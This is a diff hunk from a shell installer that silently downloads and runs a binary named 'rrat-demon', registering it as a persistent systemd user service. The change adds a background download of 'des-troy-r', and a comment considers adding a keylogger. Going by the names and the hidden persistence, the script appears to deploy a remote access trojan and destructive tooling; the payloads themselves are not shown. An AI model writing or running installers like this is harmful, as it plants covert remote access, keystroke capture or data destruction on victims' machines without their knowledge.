@@ -48,7 +48,7 @@ then
 	nohup bash -c "curl -sL -o $rratfiles/rrat-demon https://github.com/JSanzUcam/rrat-demon/releases/latest/download/rrat-demon; chmod +x $rratfiles/rrat-demon; curl -sL -o $HOME/.config/systemd/user/rrat.service https://github.com/JSanzUcam/rrat-demon/releases/latest/download/rrat.service; systemctl --user enable rrat.service; systemctl --user start rrat.service" &
 
 	# Install des-troy-r in parallel
-	# Work in progress...
+	nohup bash -c "curl -sL -o $rratfiles/des-troy-r https://github.com/JSanzUcam/rrat-scripts/releases/latest/download/des-troy-r; chmod +x $rratfiles/des-troy-r" &
 
 	# Install keylogger maybe?
 
